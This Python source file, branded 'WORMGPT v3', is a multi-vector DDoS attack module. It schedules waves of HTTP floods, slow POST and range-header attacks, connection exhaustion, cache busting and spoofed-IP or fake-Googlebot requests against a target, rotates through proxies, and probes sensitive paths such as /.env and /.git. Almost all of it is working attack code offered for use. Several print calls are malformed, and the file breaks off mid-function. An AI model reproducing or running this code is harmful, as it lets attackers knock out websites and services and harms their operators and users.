#!/usr/bin/env python3
"""
/AXMODS/DDOS/attack_method/mixed_wave.py
MIXED WAVE ATTACK MODULE - WORMGPT v3
Multi-Vector Coordinated Attack System
"""

import socket
import ssl
import random
import threading
import time
import sys
import os
import json
import hashlib
import ipaddress
import string
from urllib.parse import urlparse, quote
from dataclasses import dataclass, field
from typing import Dict, List, Tuple, Optional, Any
from enum import Enum, auto
from datetime import datetime

class WaveType(Enum):
    """Attack wave types"""
    RECON_WAVE = auto()
    PROBE_WAVE = auto()
    ASSAULT_WAVE = auto()
    SUSTAIN_WAVE = auto()
    SURGE_WAVE = auto()
    DECEPTION_WAVE = auto()
    EXHAUST_WAVE = auto()

@dataclass
class WaveMetrics:
    """Wave attack metrics"""
    wave_type: WaveType
    start_time: float
    end_time: float = 0.0
    requests_sent: int = 0
    bytes_transferred: int = 0
    success_rate: float = 0.0
    active_connections: int = 0

class MixedWaveCoordinator:
    """Coordinates multiple attack waves simultaneously"""
    
    def __init__(self, target: str, port: int = 80, intensity: int = 100, 
                 duration: int = 0, proxy: bool = False):
        """
        Initialize Mixed Wave Attack
        
        Args:
            target: Target URL
            port: Target port
            intensity: Attack intensity (1-100)
            duration: Attack duration in seconds (0=infinite)
            proxy: Use proxy rotation
        """
        self.target = target
        self.parsed_url = urlparse(target)
        self.host = self.parsed_url.netloc.split(':')[0]
        self.port = port
        self.intensity = max(1, min(100, intensity))  # Clamp to 1-100
        self.duration = duration
        self.use_proxy = proxy
        
        self.is_attacking = True
        self.active_waves: Dict[WaveType, bool] = {}
        self.wave_metrics: Dict[WaveType, WaveMetrics] = {}
        self.start_time = time.time()
        
        # Wave configurations
        self.wave_configs = {
            WaveType.RECON_WAVE: {
                'workers': max(10, int(intensity * 0.1)),
                'duration': 30,
                'techniques': ['slow_probe', 'header_scan', 'port_check']
            },
            WaveType.PROBE_WAVE: {
                'workers': max(20, int(intensity * 0.2)),
                'duration': 45,
                'techniques': ['cache_bust', 'param_fuzz', 'path_enum']
            },
            WaveType.ASSAULT_WAVE: {
                'workers': max(50, int(intensity * 0.5)),
                'duration': 120,
                'techniques': ['http_flood', 'slow_post', 'range_attack']
            },
            WaveType.SUSTAIN_WAVE: {
                'workers': max(70, int(intensity * 0.7)),
                'duration': 300,
                'techniques': ['keep_alive', 'session_spam', 'ajax_flood']
            },
            WaveType.SURGE_WAVE: {
                'workers': max(90, int(intensity * 0.9)),
                'duration': 60,
                'techniques': ['mixed_flood', 'protocol_abuse', 'resource_drain']
            },
            WaveType.DECEPTION_WAVE: {
                'workers': max(30, int(intensity * 0.3)),
                'duration': 90,
                'techniques': ['bot_mimic', 'search_engine', 'api_abuse']
            },
            WaveType.EXHAUST_WAVE: {
                'workers': max(100, intensity),
                'duration': 180,
                'techniques': ['all_methods', 'maximum_pressure', 'connection_exhaust']
            }
        }
        
        # Attack techniques registry
        self.techniques = {
            'slow_probe': self.technique_slow_probe,
            'header_scan': self.technique_header_scan,
            'port_check': self.technique_port_check,
            'cache_bust': self.technique_cache_bust,
            'param_fuzz': self.technique_param_fuzz,
            'path_enum': self.technique_path_enum,
            'http_flood': self.technique_http_flood,
            'slow_post': self.technique_slow_post,
            'range_attack': self.technique_range_attack,
            'keep_alive': self.technique_keep_alive,
            'session_spam': self.technique_session_spam,
            'ajax_flood': self.technique_ajax_flood,
            'mixed_flood': self.technique_mixed_flood,
            'protocol_abuse': self.technique_protocol_abuse,
            'resource_drain': self.technique_resource_drain,
            'bot_mimic': self.technique_bot_mimic,
            'search_engine': self.technique_search_engine,
            'api_abuse': self.technique_api_abuse,
            'all_methods': self.technique_all_methods,
            'maximum_pressure': self.technique_maximum_pressure,
            'connection_exhaust': self.technique_connection_exhaust
        }
        
        # User agent categories
        self.user_agents = {
            'desktop': [
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
            ],
            'mobile': [
                'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1',
                'Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
                'Mozilla/5.0 (Android 14; Mobile; rv:121.0) Gecko/121.0 Firefox/121.0'
            ],
            'bot': [
                'Googlebot/2.1 (+http://www.google.com/bot.html)',
                'Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)',
                'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
                'Mozilla/5.0 (compatible; MJ12bot/v1.4.8; +http://mj12bot.com/)'
            ],
            'legacy': [
                'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',
                'Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; rv:11.0) like Gecko'
            ]
        }
        
        # Proxies
        self.proxies = []
        if proxy:
            self.load_proxies()
        
        # SSL context
        self.ssl_context = ssl.create_default_context()
        self.ssl_context.check_hostname = False
        self.ssl_context.verify_mode = ssl.CERT_NONE
        
        # Attack coordination
        self.coordination_lock = threading.Lock()
        self.global_metrics = {
            'total_requests': 0,
            'total_bytes': 0,
            'total_connections': 0,
            'active_waves': 0,
            'peak_intensity': 0
        }
        
        # Wave schedule
        self.wave_schedule = []
        self.generate_wave_schedule()
        
        print(f"[+] MIXED WAVE v3.0 Initialized")
        print(f"[+] Target: {self.target}")
        print(f("[+] Intensity: {intensity}/100"))
        print(f"[+] Duration: {duration if duration > 0 else 'Infinite'}s")
        print(f"[+] Waves: {len(self.wave_configs)} configured")
        print(f"[+] Techniques: {len(self.techniques)} available")
    
    def generate_wave_schedule(self):
        """Generate wave attack schedule"""
        # Base schedule
        base_schedule = [
            (WaveType.RECON_WAVE, 0),      # Start immediately
            (WaveType.PROBE_WAVE, 10),     # After 10 seconds
            (WaveType.ASSAULT_WAVE, 25),   # After 25 seconds
            (WaveType.SUSTAIN_WAVE, 60),   # After 60 seconds
            (WaveType.SURGE_WAVE, 180),    # After 180 seconds
            (WaveType.DECEPTION_WAVE, 240), # After 240 seconds
            (WaveType.EXHAUST_WAVE, 300)   # After 300 seconds
        ]
        
        # Adjust based on duration
        if self.duration > 0:
            scale_factor = min(1.0, self.duration / 600)  # Scale for shorter attacks
            
            for wave_type, start_offset in base_schedule:
                adjusted_offset = int(start_offset * scale_factor)
                self.wave_schedule.append((wave_type, adjusted_offset))
        else:
            self.wave_schedule = base_schedule
        
        # Add repeating waves for long attacks
        if self.duration == 0 or self.duration > 600:
            repeating_waves = [
                (WaveType.ASSAULT_WAVE, 420),
                (WaveType.SURGE_WAVE, 480),
                (WaveType.EXHAUST_WAVE, 540)
            ]
            self.wave_schedule.extend(repeating_waves)
    
    def load_proxies(self):
        """Load proxies from file"""
        try:
            if os.path.exists('proxies.txt'):
                with open('proxies.txt', 'r') as f:
                    self.proxies = [line.strip() for line in f if line.strip()]
                print(f"[+] Loaded {len(self.proxies)} proxies")
        except:
            pass
    
    def get_user_agent(self, category: str = None) -> str:
        """Get user agent from category"""
        if not category:
            category = random.choice(['desktop', 'mobile', 'bot', 'legacy'])
        
        if category in self.user_agents:
            return random.choice(self.user_agents[category])
        return random.choice(self.user_agents['desktop'])
    
    def create_connection(self, wave_type: WaveType) -> Optional[socket.socket]:
        """Create connection with wave-specific settings"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            
            # Wave-specific socket options
            if wave_type in [WaveType.RECON_WAVE, WaveType.PROBE_WAVE]:
                sock.settimeout(10)
            elif wave_type in [WaveType.ASSAULT_WAVE, WaveType.SURGE_WAVE]:
                sock.settimeout(5)
                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            else:
                sock.settimeout(8)
            
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            
            # Use proxy if available
            if self.use_proxy and self.proxies:
                proxy = random.choice(self.proxies)
                proxy_host, proxy_port = proxy.split(':')
                sock.connect((proxy_host, int(proxy_port)))
                
                # HTTPS proxy CONNECT
                if self.parsed_url.scheme == 'https':
                    connect_request = f"CONNECT {self.host}:{self.port} HTTP/1.1\r\n"
                    connect_request += f"Host: {self.host}:{self.port}\r\n\r\n"
                    
                    sock.send(connect_request.encode())
                    response = sock.recv(4096)
                    
                    if b'200' not in response:
                        return None
            else:
                sock.connect((self.host, self.port))
            
            # Wrap with SSL for HTTPS
            if self.parsed_url.scheme == 'https':
                if self.use_proxy and self.proxies:
                    sock = self.ssl_context.wrap_socket(sock, server_hostname=self.host)
                else:
                    sock = self.ssl_context.wrap_socket(sock, server_hostname=self.host)
            
            with self.coordination_lock:
                self.global_metrics['total_connections'] += 1
            
            return sock
            
        except Exception as e:
            return None
    
    def generate_path(self, wave_type: WaveType) -> str:
        """Generate path based on wave type"""
        base_paths = {
            WaveType.RECON_WAVE: ['/', '/robots.txt', '/sitemap.xml', '/.env', '/config.php'],
            WaveType.PROBE_WAVE: ['/api/v1', '/admin', '/wp-admin', '/console', '/debug'],
            WaveType.ASSAULT_WAVE: ['/index.php', '/home', '/main', '/app', '/dashboard'],
            WaveType.SUSTAIN_WAVE: ['/search', '/products', '/users', '/data', '/query'],
            WaveType.SURGE_WAVE: ['/api/graphql', '/rest/v2', '/soap/service', '/rpc/json'],
            WaveType.DECEPTION_WAVE: ['/static/', '/assets/', '/images/', '/css/', '/js/'],
            WaveType.EXHAUST_WAVE: ['/']  # Root path for maximum impact
        }
        
        base_path = random.choice(base_paths.get(wave_type, ['/']))
        
        # Add parameters based on wave
        if wave_type in [WaveType.PROBE_WAVE, WaveType.SUSTAIN_WAVE]:
            param_count = random.randint(1, 5)
            params = []
            for i in range(param_count):
                param_name = ''.join(random.choices(string.ascii_lowercase, k=random.randint(3, 8)))
                param_value = ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(1, 10)))
                params.append(f"{param_name}={quote(param_value)}")
            
            if '?' in base_path:
                base_path += '&' + '&'.join(params)
            else:
                base_path += '?' + '&'.join(params)
        
        return base_path
    
    # ===== ATTACK TECHNIQUES =====
    
    def technique_slow_probe(self, sock: socket.socket, wave_id: int) -> bool:
        """Slow probing technique"""
        try:
            path = self.generate_path(WaveType.RECON_WAVE)
            headers = [
                f"GET {path} HTTP/1.1",
                f"Host: {self.host}",
                f"User-Agent: {self.get_user_agent('bot')}",
                f"Accept: */*",
                f"Connection: keep-alive",
                f"\r\n"
            ]
            
            # Send headers slowly
            for header in headers:
                sock.send(f"{header}\r\n".encode())
                time.sleep(random.uniform(0.5, 2.0))
            
            # Wait for response
            sock.settimeout(3)
            try:
                response = sock.recv(4096)
                return len(response) > 0
            except:
                return True  # Timeout is acceptable
            
        except:
            return False
    
    def technique_header_scan(self, sock: socket.socket, wave_id: int) -> bool:
        """Header scanning technique"""
        try:
            path = self.generate_path(WaveType.RECON_WAVE)
            
            # Send request with various headers
            headers = [
                f"GET {path} HTTP/1.1",
                f"Host: {self.host}",
                f"User-Agent: {self.get_user_agent()}",
                f"Accept: {random.choice(['*/*', 'text/html', 'application/json'])}",
                f"Accept-Language: {random.choice(['en-US', 'en-GB', 'fr-FR', 'de-DE'])}",
                f"Accept-Encoding: gzip, deflate, br",
                f"Connection: keep-alive",
                f"X-Forwarded-For: {self.generate_ip()}",
                f"X-Real-IP: {self.generate_ip()}",
                f"X-Request-ID: {hashlib.md5(str(time.time()).encode()).hexdigest()[:16]}",
                f"\r\n"
            ]
            
            request = '\r\n'.join(headers)
            sock.send(request.encode())
            
            with self.coordination_lock:
                self.global_metrics['total_bytes'] += len(request)
            
            return True
        except:
            return False
    
    def technique_port_check(self, sock: socket.socket, wave_id: int) -> bool:
        """Port checking technique"""
        # For now, just use the main connection
        # In a real implementation, this would check other ports
        try:
            sock.send(b"GET / HTTP/1.1\r\n\r\n")
            return True
        except:
            return False
    
    def technique_cache_bust(self, sock: socket.socket, wave_id: int) -> bool:
        """Cache busting technique"""
        try:
            # Generate unique path with cache-busting parameter
            base_path = self.generate_path(WaveType.PROBE_WAVE)
            cache_buster = f"cb={int(time.time() * 1000)}"
            
            if '?' in base_path:
                path = f"{base_path}&{cache_buster}"
            else:
                path = f"{base_path}?{cache_buster}"
            
            headers = [
                f"GET {path} HTTP/1.1",
                f"Host: {self.host}",
                f"User-Agent: {self.get_user_agent()}",
                f"Accept: */*",
                f"Cache-Control: no-cache, no-store, must-revalidate",
                f"Pragma: no-cache",
                f"Connection: close",
                f"\r\n"
            ]
            
            request = '\r\n'.join(headers)
            sock.send(request.encode())
            
            with self.coordination_lock:
                self.global_metrics['total_bytes'] += len(request)
            
            return True
        except:
            return False
    
    def technique_param_fuzz(self, sock: socket.socket, wave_id: int) -> bool:
        """Parameter fuzzing technique"""
        try:
            path = self.generate_path(WaveType.PROBE_WAVE)
            
            # Add fuzzed parameters
            fuzz_params = []
            for i in range(random.randint(3, 10)):
                param_name = ''.join(random.choices(string.ascii_lowercase, k=random.randint(3, 12)))
                # Generate various types of values
                value_type = random.choice(['string', 'number', 'special', 'long'])
                
                if value_type == 'string':
                    param_value = ''.join(random.choices(string.ascii_letters, k=random.randint(5, 50)))
                elif value_type == 'number':
                    param_value = str(random.randint(1, 1000000))
                elif value_type == 'special':
                    param_value = quote(''.join(random.choices(string.printable, k=random.randint(10, 30))))
                else:  # long
                    param_value = 'A' * random.randint(100, 1000)
                
                fuzz_params.append(f"{param_name}={quote(param_value)}")
            
            if '?' in path:
                full_path = f"{path}&{'&'.join(fuzz_params)}"
            else:
                full_path = f"{path}?{'&'.join(fuzz_params)}"
            
            headers = [
                f"GET {full_path} HTTP/1.1",
                f"Host: {self.host}",
                f"User-Agent: {self.get_user_agent()}",
                f"Accept: */*",
                f"Connection: close",
                f"\r\n"
            ]
            
            request = '\r\n'.join(headers)
            sock.send(request.encode())
            
            with self.coordination_lock:
                self.global_metrics['total_bytes'] += len(request)
            
            return True
        except:
            return False
    
    def technique_path_enum(self, sock: socket.socket, wave_id: int) -> bool:
        """Path enumeration technique"""
        try:
            # Common paths to enumerate
            common_paths = [
                '/admin', '/administrator', '/wp-admin', '/wp-login.php',
                '/login', '/signin', '/auth', '/register', '/signup',
                '/api', '/api/v1', '/api/v2', '/graphql', '/rest',
                '/config', '/configuration', '/settings', '/setup',
                '/backup', '/backups', '/dump', '/sql', '/database',
                '/.git', '/svn', '/cvs', '/.env', '/config.php',
                '/phpinfo.php', '/info.php', '/test.php', '/debug.php'
            ]
            
            path = random.choice(common_paths)
            
            headers = [
                f"GET {path} HTTP/1.1",
                f"Host: {self.host}",
                f"User-Agent: {self.get_user_agent('bot')}",
                f"Accept: */*",
                f"Connection: close",
                f"\r\n"
            ]
            
            request = '\r\n'.join(headers)
            sock.send(request.encode())
            
            with self.coordination_lock:
                self.global_metrics['total_bytes'] += len(request)
            
            return True
        except:
            return False
    
    def technique_http_flood(self, sock: socket.socket, wave_id: int) -> bool:
        """HTTP flood technique"""
        try:
            path = self.generate_path(WaveType.ASSAULT_WAVE)
            
            headers = [
                f"GET {path} HTTP/1.1",
                f"Host: {self.host}",
                f"User-Agent: {self.get_user_agent()}",
                f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                f"Accept-Language: en-US,en;q=0.5",
                f"Accept-Encoding: gzip, deflate, br",
                f"Connection: {'keep-alive' if random.random() > 0.3 else 'close'}",
                f"Cache-Control: no-cache",
                f"Pragma: no-cache",
                f"Upgrade-Insecure-Requests: 1",
                f"\r\n"
            ]
            
            request = '\r\n'.join(headers)
            sock.send(request.encode())
            
            with self.coordination_lock:
                self.global_metrics['total_bytes'] += len(request)
            
            return True
        except:
            return False
    
    def technique_slow_post(self, sock: socket.socket, wave_id: int) -> bool:
        """Slow POST technique"""
        try:
            path = random.choice(['/submit', '/post', '/api/submit', '/form'])
            
            # Generate form data
            form_fields = []
            for i in range(random.randint(3, 8)):
                field_name = ''.join(random.choices(string.ascii_lowercase, k=random.randint(4, 10)))
                field_value = ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(10, 100)))
                form_fields.append(f"{field_name}={quote(field_value)}")
            
            form_data = '&'.join(form_fields)
            
            headers = [
                f"POST {path} HTTP/1.1",
                f"Host: {self.host}",
                f"User-Agent: {self.get_user_agent()}",
                f"Accept: */*",
                f"Content-Type: application/x-www-form-urlencoded",
                f"Content-Length: {len(form_data)}",
                f"Connection: keep-alive",
                f"\r\n"
            ]
            
            # Send headers
            header_data = '\r\n'.join(headers)
            sock.send(header_data.encode())
            
            # Send body slowly
            bytes_sent = 0
            while bytes_sent < len(form_data):
                chunk_size = random.randint(1, 10)
                chunk = form_data[bytes_sent:bytes_sent + chunk_size]
                sock.send(chunk.encode())
                bytes_sent += len(chunk)
                time.sleep(random.uniform(0.1, 1.0))
            
            with self.coordination_lock:
                self.global_metrics['total_bytes'] += len(header_data) + len(form_data)
            
            return True
        except:
            return False
    
    def technique_range_attack(self, sock: socket.socket, wave_id: int) -> bool:
        """Byte range attack technique"""
        try:
            path = self.generate_path(WaveType.ASSAULT_WAVE)
            
            # Generate random byte ranges
            range_count = random.randint(2, 10)
            ranges = []
            total_size = random.randint(10000, 1000000)
            
            for i in range(range_count):
                start = random.randint(0, total_size - 100)
                end = start + random.randint(1, 1000)
                ranges.append(f"{start}-{end}")
            
            range_header = f"bytes={','.join(ranges)}"
            
            headers = [
                f"GET {path} HTTP/1.1",
                f"Host: {self.host}",
                f"User-Agent: {self.get_user_agent()}",
                f"Accept: */*",
                f"Range: {range_header}",
                f"Connection: close",
                f"\r\n"
            ]
            
            request = '\r\n'.join(headers)
            sock.send(request.encode())
            
            with self.coordination_lock:
                self.global_metrics['total_bytes'] += len(request)
            
            return True
        except:
            return False
    
    def technique_keep_alive(self, sock: socket.socket, wave_id: int) -> bool:
        """Keep-alive connection technique"""
        try:
            # Send multiple requests on same connection
            for i in range(random.randint(5, 20)):
                path = self.generate_path(WaveType.SUSTAIN_WAVE)
                
                headers = [
                    f"GET {path} HTTP/1.1",
                    f"Host: {self.host}",
                    f"User-Agent: {self.get_user_agent()}",
                    f"Accept: */*",
                    f"Connection: keep-alive",
                    f"\r\n"
                ]
                
                request = '\r\n'.join(headers)
                sock.send(request.encode())
                
                with self.coordination_lock:
                    self.global_metrics['total_bytes'] += len(request)
                
                time.sleep(random.uniform(0.1, 0.5))
            
            return True
        except:
            return False
    
    def technique_session_spam(self, sock: socket.socket, wave_id: int) -> bool:
        """Session spamming technique"""
        try:
            # Generate session cookies
            cookies = []
            cookie_count = random.randint(1, 5)
            for i in range(cookie_count):
                cookie_name = random.choice(['SESSIONID', 'PHPSESSID', 'JSESSIONID', 'auth_token'])
                cookie_value = ''.join(random.choices(string.hexdigits, k=random.randint(16, 64)))
                cookies.append(f"{cookie_name}={cookie_value}")
            
            path = self.generate_path(WaveType.SUSTAIN_WAVE)
            
            headers = [
                f"GET {path} HTTP/1.1",
                f"Host: {self.host}",
                f"User-Agent: {self.get_user_agent()}",
                f"Accept: */*",
                f"Cookie: {'; '.join(cookies)}",
                f"Connection: keep-alive",
                f"\r\n"
            ]
            
            request = '\r\n'.join(headers)
            sock.send(request.encode())
            
            with self.coordination_lock:
                self.global_metrics['total_bytes'] += len(request)
            
            return True
        except:
            return False
    
    def technique_ajax_flood(self, sock: socket.socket, wave_id: int) -> bool:
        """AJAX flood technique"""
        try:
            path = self.generate_path(WaveType.SUSTAIN_WAVE)
            
            headers = [
                f"GET {path} HTTP/1.1",
                f"Host: {self.host}",
                f"User-Agent: {self.get_user_agent()}",
                f"Accept: application/json, text/javascript, */*; q=0.01",
                f"Accept-Language: en-US,en;q=0.9",
                f"X-Requested-With: XMLHttpRequest",
                f"X-CSRF-Token: {hashlib.md5(str(time.time()).encode()).hexdigest()[:16]}",
                f"Connection: keep-alive",
                f"\r\n"
            ]
            
            request = '\r\n'.join(headers)
            sock.send(request.encode())
            
            with self.coordination_lock:
                self.global_metrics['total_bytes'] += len(request)
            
            return True
        except:
            return False
    
    def technique_mixed_flood(self, sock: socket.socket, wave_id: int) -> bool:
        """Mixed flood technique"""
        try:
            # Mix different request types
            request_types = ['GET', 'POST', 'HEAD', 'OPTIONS']
            method = random.choice(request_types)
            
            path = self.generate_path(WaveType.SURGE_WAVE)
            
            headers = [
                f"{method} {path} HTTP/1.1",
                f"Host: {self.host}",
                f"User-Agent: {self.get_user_agent()}",
                f"Accept: */*",
                f"Connection: close",
                f"\r\n"
            ]
            
            request = '\r\n'.join(headers)
            sock.send(request.encode())
            
            with self.coordination_lock:
                self.global_metrics['total_bytes'] += len(request)
            
            return True
        except:
            return False
    
    def technique_protocol_abuse(self, sock: socket.socket, wave_id: int) -> bool:
        """Protocol abuse technique"""
        try:
            # Send malformed or unusual requests
            malformed_requests = [
                # Missing host header
                f"GET / HTTP/1.1\r\n\r\n",
                # Invalid method
                f"TEST / HTTP/1.1\r\nHost: {self.host}\r\n\r\n",
                # HTTP/0.9
                f"GET /\r\n",
                # Large headers
                f"GET / HTTP/1.1\r\nHost: {self.host}\r\n{'X-Test: a' * 100}\r\n\r\n"
            ]
            
            request = random.choice(malformed_requests)
            sock.send(request.encode())
            
            with self.coordination_lock:
                self.global_metrics['total_bytes'] += len(request)
            
            return True
        except:
            return False
    
    def technique_resource_drain(self, sock: socket.socket, wave_id: int) -> bool:
        """Resource draining technique"""
        try:
            # Request resource-intensive pages
            resource_paths = [
                '/search?q=' + quote(''.join(random.choices(string.ascii_letters, k=50))),
                '/report/generate',
                '/export/data',
                '/render/complex'
            ]
            
            path = random.choice(resource_paths)
            
            headers = [
                f"GET {path} HTTP/1.1",
                f"Host: {self.host}",
                f"User-Agent: {self.get_user_agent()}",
                f"Accept: */*",
                f"Connection: close",
                f"\r\n"
            ]
            
            request = '\r\n'.join(headers)
            sock.send(request.encode())
            
            with self.coordination_lock:
                self.global_metrics['total_bytes'] += len(request)
            
            return True
        except:
            return False
    
    def technique_bot_mimic(self, sock: socket.socket, wave_id: int) -> bool:
        """Bot mimicking technique"""
        try:
            path = self.generate_path(WaveType.DECEPTION_WAVE)
            
            headers = [
                f"GET {path} HTTP/1.1",
                f"Host: {self.host}",
                f"User-Agent: {self.get_user_agent('bot')}",
                f"Accept: */*",
                f"Connection: close",
                f"\r\n"
            ]
            
            request = '\r\n'.join(headers)
            sock.send(request.encode())
            
            with self.coordination_lock:
                self.global_metrics['total_bytes'] += len(request)
            
            return True
        except:
            return False
    
    def technique_search_engine(self, sock: socket.socket, wave_id: int) -> bool:
        """Search engine mimicking technique"""
        try:
            # Mimic search engine crawler
            referers = [
                'https://www.google.com/',
                'https://www.bing.com/',
                'https://www.yahoo.com/',
                'https://duckduckgo.com/'
            ]
            
            path = self.generate_path(WaveType.DECEPTION_WAVE)
            
            headers = [
                f"GET {path} HTTP/1.1",
                f"Host: {self.host}",
                f"User-Agent: {self.get_user_agent('bot')}",
                f"Accept: */*",
                f"Referer: {random.choice(referers)}",
                f"Connection: close",
                f"\r\n"
            ]
            
            request = '\r\n'.join(headers)
            sock.send(request.encode())
            
            with self.coordination_lock:
                self.global_metrics['total_bytes'] += len(request)
            
            return True
        except:
            return False
    
    def technique_api_abuse(self, sock: socket.socket, wave_id: int) -> bool:
        """API abuse technique"""
        try:
            api_endpoints = [
                '/api/v1/users',
                '/api/v2/products',
                '/graphql',
                '/rest/data',
                '/soap/service'
            ]
            
            path = random.choice(api_endpoints)
            
            headers = [
                f"POST {path} HTTP/1.1",
                f"Host: {self.host}",
                f"User-Agent: {self.get_user_agent()}",
                f"Accept: application/json",
                f"Content-Type: application/json",
                f"Content-Length: 100",
                f"Connection: close",
                f"\r\n"
            ]
            
            # Add minimal JSON body
            json_body = '{"test":"data"}' + ' ' * 80
            
            request = '\r\n'.join(headers) + json_body
            sock.send(request.encode())
            
            with self.coordination_lock:
                self.global_metrics['total_bytes'] += len(request)
            
            return True
        except:
            return False
    
    def technique_all_methods(self, sock: socket.socket, wave_id: int) -> bool:
        """All methods technique"""
        try:
            # Execute multiple techniques
            techniques_to_use = random.sample(list(self.techniques.keys()), 
                                             min(5, len(self.techniques)))
            
            for tech_name in techniques_to_use:
                if tech_name in ['all_methods', 'maximum_pressure', 'connection_exhaust']:
                    continue
                
                tech_func = self.techniques[tech_name]
                success = tech_func(sock, wave_id)
                
                if not success:
                    break
                
                time.sleep(0.1)
            
            return True
        except:
            return False
    
    def technique_maximum_pressure(self, sock: socket.socket, wave_id: int) -> bool:
        """Maximum pressure technique"""
        try:
            # Send as many requests as possible
            for i in range(random.randint(10, 50)):
                tech_name = random.choice(list(self.techniques.keys()))
                if tech_name in ['maximum_pressure', 'connection_exhaust']:
                    tech_name = 'http_flood'
                
                tech_func = self.techniques[tech_name]
                tech_func(sock, wave_id)
                
                # Minimal delay
                time.sleep(0.01)
            
            return True
        except:
            return False
    
    def technique_connection_exhaust(self, sock: socket.socket, wave_id: int) -> bool:
        """Connection exhaustion technique"""
        try:
            # Keep connection open as long as possible
            start_time = time.time()
            max_duration = random.uniform(30, 180)
            
            while time.time() - start_time < max_duration and self.is_attacking:
                # Send occasional keep-alive
                if random.random() > 0.8:
                    sock.send(f"X-Keep-Alive: {int(time.time())}\r\n".encode())
                
                time.sleep(random.uniform(5, 15))
            
            return True
        except:
            return False
    
    def generate_ip(self) -> str:
        """Generate random IP address"""
        return f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
    
    def wave_worker(self, wave_type: WaveType, worker_id: int):
        """Worker for a specific wave"""
        wave_config = self.wave_configs[wave_type]
        techniques = wave_config['techniques']
        
        # Initialize metrics for this worker
        worker_start = time.time()
        worker_requests = 0
        worker_bytes = 0
        
        while self.is_attacking and self.active_waves.get(wave_type, False):
            # Check wave duration
            if time.time() - worker_start > wave_config['duration']:
                break
            
            # Check global duration
            if self.duration > 0 and time.time() - self.start_time > self.duration:
                break
            
            # Create connection
            sock = self.create_connection(wave_type)
            if not sock:
                time.sleep(1)
                continue
            
            try:
                # Select technique
                technique_name = random.choice(techniques)
                technique_func = self.techniques.get(technique_name, self.technique_http_flood)
                
                # Execute technique
                success = technique_func(sock, worker_id)
                
                if success:
                    worker_requests += 1
                    with self.coordination_lock:
                        self.global_metrics['total_requests'] += 1
                
                sock.close()
                
                # Update wave metrics
                if wave_type in self.wave_metrics:
                    with self.coordination_lock:
                        wave_metrics = self.wave_metrics[wave_type]
                        wave_metrics.requests_sent += 1
                        wave_metrics.bytes_transferred += worker_bytes
                        wave_metrics.active_connections = len([w for w in self.active_waves.values() if w])
                
                # Worker delay based on wave type
                if wave_type == WaveType.RECON_WAVE:
                    time.sleep(random.uniform(0.5, 2.0))
                elif wave_type == WaveType.ASSAULT_WAVE:
                    time.sleep(random.uniform(0.05, 0.2))
                elif wave_type == WaveType.SURGE_WAVE:
                    time.sleep(random.uniform(0.01, 0.1))
                else:
                    time.sleep(random.uniform(0.1, 0.5))
                    
            except Exception as e:
                try:
                    sock.close()
                except:
                    pass
                time.sleep(0.5)
    
    def start_wave(self, wave_type: WaveType):
        """Start a specific attack wave"""
        if wave_type in self.active_waves and self.active_waves[wave_type]:
            return  # Wave already running
        
        wave_config = self.wave_configs[wave_type]
        
        print(f"[+] Starting {wave_type.name.replace('_', ' ')}")
        print(f"[+] Workers: {wave_config['workers']}")
        print(f("[+] Duration: {wave_config['duration']}s"))
        print(f"[+] Techniques: {', '.join(wave_config['techniques'])}")
        
        # Initialize metrics
        self.wave_metrics[wave_type] = WaveMetrics(
            wave_type=wave_type,
            start_time=time.time(),
            active_connections=wave_config['workers']
        )
        
        # Mark wave as active
        self.active_waves[wave_type] = True
        
        # Start workers
        threads = []
        for i in range(wave_config['workers']):
            thread = threading.Thread(target=self.wave_worker, args=(wave_type, i))
            thread.daemon = True
            threads.append(thread)
            thread.start()
            
            # Stagger thread starts
            if i % 10 == 0:
                time.sleep(0.1)
        
        # Monitor wave duration
        def wave_monitor():
            start_time = time.time()
            duration = wave_config['duration']
            
            while time.time() - start_time < duration and self.is_attacking:
                time.sleep(1)
            
            # Stop wave
            self.stop_wave(wave_type)
        
        monitor_thread = threading.Thread(target=wave_monitor)
        monitor_thread.daemon = True
        monitor_thread.start()
    
    def stop_wave(self, wave_type: WaveType):
        """Stop a specific attack wave"""
        if wave_type in self.active_waves:
            self.active_waves[wave_type] = False
            
            # Update metrics
            if wave_type in self.wave_metrics:
                self.wave_metrics[wave_type].end_time = time.time()
            
            print(f"[+] Stopped {wave_type.name.replace('_', ' ')}")
    
    def wave_scheduler(self):
        """Schedule wave attacks"""
        print(f"[+] Wave scheduler started")
        print(f("[+] Total waves: {len(self.wave_schedule)}"))
        
        wave_start_times = {}
        
        for wave_type, start_offset in self.wave_schedule:
            wave_start_times[wave_type] = self.start_time + start_offset
        
        while self.is_attacking:
            current_time = time.time()
            
            # Check global duration
            if self.duration > 0 and current_time - self.start_time > self.duration:
                break
            
            # Check scheduled waves
            for wave_type, scheduled_time in wave_start_times.items():
                if (current_time >= scheduled_time and 
                    wave_type not in self.active_waves):
                    
                    self.start_wave(wave_type)
                    # Remove from schedule
                    wave_start_times.pop(wave_type, None)
            
            # Update active waves count
